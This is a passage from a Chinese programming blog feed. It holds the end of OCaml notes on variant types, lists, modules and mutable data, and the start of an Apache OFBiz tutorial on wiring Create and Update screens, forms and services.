<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> seasons = <span class="type">Spring</span> | <span class="type">Summer</span> | <span class="type">Autumn</span> | <span class="type">Winter</span> ;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> int_of_seasons = <span class="keyword">function</span></span><br><span class="line">    <span class="type">Spring</span> -&gt; <span class="number">1</span></span><br><span class="line">  | <span class="type">Summer</span> -&gt; <span class="number">2</span></span><br><span class="line">  | <span class="type">Autumn</span> -&gt; <span class="number">3</span></span><br><span class="line">  | <span class="type">Winter</span> -&gt; <span class="number">4</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* val int_of_seasons : seasons -&gt; int = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line">int_of_seasons <span class="type">Autumn</span> ;;  <span class="comment">(* - : int = 3 *)</span></span><br></pre></td></tr></table></figure>

<h4 id="6-4-2-带参构造子"><a href="#6-4-2-带参构造子" class="headerlink" title="6.4.2. 带参构造子"></a>6.4.2. 带参构造子</h4><p>带参构造子。构造子相当于类型，可以用于定义变量</p>
<p>示例：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> num = <span class="type">Int</span> <span class="keyword">of</span> <span class="built_in">int</span> | <span class="type">Float</span> <span class="keyword">of</span> <span class="built_in">float</span> ;;</span><br><span class="line"></span><br><span class="line"><span class="type">Int</span> <span class="number">3</span> ;;  <span class="comment">(* - : num = Int 3 *)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> add_num = <span class="keyword">function</span></span><br><span class="line">    (<span class="type">Int</span> m, <span class="type">Int</span> n) -&gt; <span class="type">Int</span> (m+n)</span><br><span class="line">  | (<span class="type">Int</span> m, <span class="type">Float</span> n) -&gt; <span class="type">Float</span> ((float_of_int m) +. n)</span><br><span class="line">  | (<span class="type">Float</span> m, <span class="type">Int</span> n) -&gt; <span class="type">Float</span> (m +. (float_of_int n))</span><br><span class="line">  | (<span class="type">Float</span> m, <span class="type">Float</span> n) -&gt; <span class="type">Float</span> (m +. n)</span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* val add_num : num * num -&gt; num = &lt;fun&gt; *)</span></span><br></pre></td></tr></table></figure>

<h4 id="6-4-3-递归类型"><a href="#6-4-3-递归类型" class="headerlink" title="6.4.3. 递归类型"></a>6.4.3. 递归类型</h4><p>示例，定义一个二叉树：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> inttree =</span><br><span class="line">    <span class="type">Leaf</span> <span class="keyword">of</span> <span class="built_in">int</span></span><br><span class="line">  | <span class="type">Node</span> <span class="keyword">of</span> inttree * inttree <span class="comment">(* *号表明是元组类型，不是乘号 *)</span></span><br><span class="line">;;</span><br></pre></td></tr></table></figure>

<h4 id="6-4-4-带多态变量的联合类型"><a href="#6-4-4-带多态变量的联合类型" class="headerlink" title="6.4.4. 带多态变量的联合类型"></a>6.4.4. 带多态变量的联合类型</h4><h4 id="6-4-5-多态变体"><a href="#6-4-5-多态变体" class="headerlink" title="6.4.5. 多态变体"></a>6.4.5. 多态变体</h4><h3 id="6-5-表-list-不可以修改"><a href="#6-5-表-list-不可以修改" class="headerlink" title="6.5. 表(list 不可以修改)"></a>6.5. 表(list 不可以修改)</h3><p>类型描述：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&lt;类型&gt; <span class="built_in">list</span></span><br></pre></td></tr></table></figure>

<h4 id="6-5-1-创建"><a href="#6-5-1-创建" class="headerlink" title="6.5.1. 创建"></a>6.5.1. 创建</h4><figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">[ e1; e2; ... en;]</span><br></pre></td></tr></table></figure>

<p><code>ei</code>可以是变量或者常量，但类型必须相同。</p>
<h4 id="6-5-2-添加"><a href="#6-5-2-添加" class="headerlink" title="6.5.2. 添加"></a>6.5.2. 添加</h4><p>头插：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>::[<span class="number">2</span>;<span class="number">3</span>];;</span><br><span class="line">- : <span class="built_in">int</span> <span class="built_in">list</span> = [<span class="number">1</span>; <span class="number">2</span>; <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<p>追加：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"># <span class="type">List</span>.append [<span class="number">1</span>;<span class="number">2</span>] [<span class="number">3</span>;<span class="number">4</span>] ;;</span><br><span class="line">- : <span class="built_in">int</span> <span class="built_in">list</span> = [<span class="number">1</span>; <span class="number">2</span>; <span class="number">3</span>; <span class="number">4</span>]</span><br><span class="line"># [<span class="number">1</span>;<span class="number">2</span>] @ [<span class="number">3</span>;<span class="number">4</span>] ;;</span><br><span class="line">- : <span class="built_in">int</span> <span class="built_in">list</span> = [<span class="number">1</span>; <span class="number">2</span>; <span class="number">3</span>; <span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<h4 id="6-5-3-取表头表尾"><a href="#6-5-3-取表头表尾" class="headerlink" title="6.5.3. 取表头表尾"></a>6.5.3. 取表头表尾</h4><p>表头是第一个元素，表尾是除第一个元素外的子表。</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"># <span class="type">List</span>.hd [<span class="number">1</span>;<span class="number">2</span>;<span class="number">3</span>] ;;</span><br><span class="line">- : <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line"># <span class="type">List</span>.tl [<span class="number">1</span>;<span class="number">2</span>;<span class="number">3</span>] ;;</span><br><span class="line">- : <span class="built_in">int</span> <span class="built_in">list</span> = [<span class="number">2</span>; <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<p><strong>注意：表中元素也不可以修改！！！</strong></p>
<h3 id="6-6-汇总"><a href="#6-6-汇总" class="headerlink" title="6.6. 汇总"></a>6.6. 汇总</h3><figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="type">OCaml</span> 名字     类型定义的例子                    用法</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>            <span class="built_in">int</span> <span class="built_in">list</span>                       [<span class="number">1</span>; <span class="number">2</span>; <span class="number">3</span>]</span><br><span class="line">tuple          <span class="built_in">int</span> * <span class="built_in">string</span>                   (<span class="number">3</span>, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">record         <span class="keyword">type</span> pair =                    &#123; a = <span class="number">3</span>; b = <span class="string">&quot;hello&quot;</span> &#125;</span><br><span class="line">                 &#123; a: <span class="built_in">int</span>; b: <span class="built_in">string</span> &#125;</span><br><span class="line">变体            <span class="keyword">type</span> foo =</span><br><span class="line">                 | <span class="type">Int</span> <span class="keyword">of</span> <span class="built_in">int</span>                 <span class="type">Int</span> <span class="number">3</span></span><br><span class="line">                 | <span class="type">Pair</span> <span class="keyword">of</span> <span class="built_in">int</span> * <span class="built_in">string</span></span><br><span class="line">变体            <span class="keyword">type</span> sign =</span><br><span class="line">                 | <span class="type">Positive</span>                   <span class="type">Positive</span></span><br><span class="line">                 | <span class="type">Zero</span>                       <span class="type">Zero</span></span><br><span class="line">                 | <span class="type">Negative</span></span><br><span class="line">参数化变体       <span class="keyword">type</span> <span class="symbol">&#x27;a</span> my_list =</span><br><span class="line">                 | <span class="type">Empty</span>                      <span class="type">Cons</span> (<span class="number">1</span>, <span class="type">Cons</span> (<span class="number">2</span>, <span class="type">Empty</span>))</span><br><span class="line">                 | <span class="type">Cons</span> <span class="keyword">of</span> <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;a</span> my_list</span><br></pre></td></tr></table></figure>

<h2 id="7-模块"><a href="#7-模块" class="headerlink" title="7. 模块"></a>7. 模块</h2><h3 id="7-1-文件即模块"><a href="#7-1-文件即模块" class="headerlink" title="7.1. 文件即模块"></a>7.1. 文件即模块</h3><p>如果有一个<code>util.ml</code>文件：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* util.ml *)</span></span><br><span class="line"><span class="keyword">let</span> msg = <span class="string">&quot;helloworld&quot;</span> ;;</span><br><span class="line"><span class="keyword">let</span> printMsg =</span><br><span class="line">  print_endline msg</span><br><span class="line">;;</span><br></pre></td></tr></table></figure>

<p>那么，可以在另一个<code>main.ml</code>文件中：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">print_endline <span class="type">Util</span>.msg ;;</span><br></pre></td></tr></table></figure>

<p>调用<code>Util</code>模块(即<code>util.ml</code>文件)中的变量或者函数。</p>
<p>如果还存在一个<code>util.mli</code>文件，那它就是<code>util.ml</code>模块的接口。未在<code>util.mli</code>中出现的变量或函数，都不能被调用。同时，<code>util.mli</code>文件需要在<code>util.ml</code>文件编译前编译，如下：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">ocamlc -c util.mli -o util.cmi</span><br></pre></td></tr></table></figure>

<h3 id="7-2-接口和模块定义"><a href="#7-2-接口和模块定义" class="headerlink" title="7.2. 接口和模块定义"></a>7.2. 接口和模块定义</h3><p>接口定义</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="keyword">type</span> &lt;接口名&gt; =</span><br><span class="line">  <span class="keyword">sig</span></span><br><span class="line">    &lt;接口定义体&gt;</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><strong>&lt;接口名&gt;是一个大写字母开头的标识符，&lt;接口定义体&gt;中包括了 type 定义、函数的类型描述等内容。</strong></p>
<p>模块定义：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> &lt;模块名&gt; [:&lt;模块接口&gt;] =</span><br><span class="line">  <span class="keyword">struct</span></span><br><span class="line">    &lt;模块体&gt;</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><strong>&lt;模块名&gt;是一个大写字母开头的标识符，&lt;模块体&gt;中包括了 type 定义和 let 定义。</strong></p>
<h2 id="8-命令式程序设计"><a href="#8-命令式程序设计" class="headerlink" title="8. 命令式程序设计"></a>8. 命令式程序设计</h2><h3 id="8-1-可更改变量"><a href="#8-1-可更改变量" class="headerlink" title="8.1. 可更改变量"></a>8.1. 可更改变量</h3><p>定义：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &lt;变量&gt; = <span class="built_in">ref</span> &lt;表达式&gt; ;;</span><br></pre></td></tr></table></figure>

<p>引用：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">!&lt;变量&gt;</span><br></pre></td></tr></table></figure>

<p>赋值：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&lt;变量&gt; := &lt;表达式&gt;</span><br></pre></td></tr></table></figure>

<h3 id="8-2-可更改记录"><a href="#8-2-可更改记录" class="headerlink" title="8.2. 可更改记录"></a>8.2. 可更改记录</h3><p>定义：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> &lt;记录类型&gt; = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">mutable</span> &lt;分量名&gt; : &lt;分量类型&gt;;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>赋值：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&lt;记录&gt;.&lt;分量&gt; &lt;- &lt;表达式&gt;</span><br></pre></td></tr></table></figure>

<h3 id="8-3-可修改的数组-Array"><a href="#8-3-可修改的数组-Array" class="headerlink" title="8.3. 可修改的数组(Array)"></a>8.3. 可修改的数组(Array)</h3><p>定义：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [|<span class="number">1</span>;<span class="number">2</span>;<span class="number">3</span>|] ;;</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&lt;数组&gt;.(&lt;下标&gt;) <span class="comment">(* 如：mart.(1).(2) *)</span></span><br></pre></td></tr></table></figure>

<p>赋值：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&lt;数组&gt;.(&lt;下标&gt;) &lt;- &lt;表达式&gt;</span><br></pre></td></tr></table></figure>

<p>常用函数：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="type">Array</span>.make <span class="number">4</span> <span class="number">1</span>; <span class="comment">(* 创建长度为4的一维数组，都初始化为1 *)</span></span><br><span class="line"><span class="type">Array</span>.make_matrix <span class="number">2</span> <span class="number">3</span> <span class="number">0</span>; <span class="comment">(* 创建行为2列为3的二维数组，都初始化为0 *)</span></span><br><span class="line"><span class="type">Array</span>.length arr; <span class="comment">(* 返回数组长度 *)</span></span><br><span class="line"><span class="type">Array</span>.iter print_int [|<span class="number">1</span>;<span class="number">2</span>;<span class="number">3</span>|]; <span class="comment">(* 把一个函数作用于数组每个元素上 *)</span></span><br></pre></td></tr></table></figure>

<h3 id="8-4-for循环"><a href="#8-4-for循环" class="headerlink" title="8.4. for循环"></a>8.4. for循环</h3><figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> &lt;变量&gt;=&lt;初始表达式&gt; <span class="keyword">to</span> &lt;终止表达式&gt; <span class="keyword">do</span></span><br><span class="line">  &lt;表达式<span class="number">1</span>&gt;;</span><br><span class="line">  ...</span><br><span class="line">  &lt;表达式n&gt;;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>OCaml</tag>
      </tags>
  </entry>
  <entry>
    <title>ofbiz学习之部署组件2</title>
    <url>/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B62.html</url>
    <content><![CDATA[<h3 id="一、实现Create以及Update功能"><a href="#一、实现Create以及Update功能" class="headerlink" title="一、实现Create以及Update功能"></a>一、实现Create以及Update功能</h3><p>1、在我们完成的第一张视图中，有一个“新增”按钮，它对应第三—4步的ProductPlan装饰器中的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">container</span> <span class="attr">style</span>=<span class="string">&quot;button-bar&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">target</span>=<span class="string">&quot;EditProductPlan&quot;</span> <span class="attr">text</span>=<span class="string">&quot;新建&quot;</span> <span class="attr">style</span>=<span class="string">&quot;buttontext create&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>同时在完成的第二张视图中，有一个“修改”按钮，它对应第六—3步中的ViewProductPlan表单中的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;submitButton&quot;</span> <span class="attr">title</span>=<span class="string">&quot;修改&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">submit</span> <span class="attr">button-type</span>=<span class="string">&quot;button&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这两个按钮都指向EditProductPlan请求（表单ViewProductPlan的target属性为EditProductPlan），因此，我们又得如出一辙地部署一个EditProductPlan请求和响应视图，重复性工作，直接上代码：</p>
<p>（1）controller.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;EditProductPlan&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;EditProductPlan&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;EditProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://learning/widget/learningScreens.xml#EditProductPlan&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>（2）learningScreens.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;EditProductPlan&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;ProductPlanId&quot;</span> <span class="attr">from-field</span>=<span class="string">&quot;parameters.ProductPlanId&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">entity-one</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlan&quot;</span> <span class="attr">value-field</span>=<span class="string">&quot;ProductPlan&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;CommonRoutingDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://manufacturing/widget/manufacturing/RoutingScreens.xml&quot;</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">screenlet</span> <span class="attr">title</span>=<span class="string">&quot;生产计划表&quot;</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">container</span> <span class="attr">style</span>=<span class="string">&quot;button-bar&quot;</span>&gt;</span></span><br><span class="line">                               <span class="tag">&lt;<span class="name">link</span> <span class="attr">target</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">text</span>=<span class="string">&quot;返回&quot;</span> <span class="attr">style</span>=<span class="string">&quot;buttontext&quot;</span>/&gt;</span></span><br><span class="line">                           <span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;EditProductPlan&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://learning/widget/learningForms.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include-form</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（3）learningForms.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;EditProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;single&quot;</span> <span class="attr">target</span>=<span class="string">&quot;UpdateProductPlan&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">default-map-name</span>=<span class="string">&quot;ProductPlan&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 以下是当表单为空时，将请求交给Create --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">alt-target</span> <span class="attr">use-when</span>=<span class="string">&quot;ProductPlan==null&quot;</span> <span class="attr">target</span>=<span class="string">&quot;CreateProductPlan&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">tooltip</span>=<span class="string">&quot;*&quot;</span>  <span class="attr">widget-style</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">tooltip</span>=<span class="string">&quot;*&quot;</span>  <span class="attr">widget-style</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">lookup</span> <span class="attr">target-form-name</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span> <span class="attr">size</span>=<span class="string">&quot;16&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">tooltip</span>=<span class="string">&quot;*&quot;</span>  <span class="attr">widget-style</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">lookup</span> <span class="attr">target-form-name</span>=<span class="string">&quot;LookupProductPlanPerson&quot;</span> <span class="attr">size</span>=<span class="string">&quot;16&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;preparationId&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">lookup</span> <span class="attr">target-form-name</span>=<span class="string">&quot;LookupProductPlanPreparation&quot;</span> <span class="attr">size</span>=<span class="string">&quot;16&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;useProject&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">date-time</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">date-time</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;submitButton&quot;</span> <span class="attr">title</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">submit</span> <span class="attr">button-type</span>=<span class="string">&quot;button&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、当EditProductPlan表单完成后，会提交到CreateProductPlan或UpdateProductPlan请求，而这取决于表单一开始是否为空，例如新建时表单为空提交给CreateProductPlan。<strong>由于此处涉及到对数据库的增加和更新，则需要调用services服务</strong>，笔者在此使用java实现该服务。</p>
<p>（1）调用服务的第一步是要在learning&#x2F;servicedef&#x2F;services.xml文件中声明该服务：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">services</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">&quot;http://ofbiz.apache.org/dtds/services.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>learning Services<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">vendor</span>&gt;</span><span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">&quot;createProductPlan&quot;</span> <span class="attr">engine</span>=<span class="string">&quot;java&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">location</span>=<span class="string">&quot;org.ofbiz.learning.ProductPlanServices&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;createProductPlan&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Create a ProductPlan<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;preparationId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;useProject&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java.sql.Timestamp&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java.sql.Timestamp&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">&quot;updateProductPlan&quot;</span> <span class="attr">engine</span>=<span class="string">&quot;java&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">location</span>=<span class="string">&quot;org.ofbiz.learning.ProductPlanServices&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;updateProductPlan&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Update a ProductPlan<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span 